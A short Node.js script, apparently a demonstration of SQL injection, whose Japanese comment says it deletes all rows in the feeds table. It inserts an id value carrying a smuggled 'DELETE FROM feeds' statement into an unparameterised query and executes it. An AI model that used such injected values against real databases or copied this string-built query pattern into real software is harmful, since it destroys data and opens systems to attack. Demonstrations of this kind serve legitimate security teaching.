import { pool } from './lib/db.js';

// SQL インジェクション用: feeds のデータをすべて削除
const id = '1"; DELETE FROM feeds; -- '

const sql = `SELECT * FROM users WHERE id = "${id}";`
console.log(sql)
const [rows] = await pool.query(sql);

console.table(rows);

pool.end();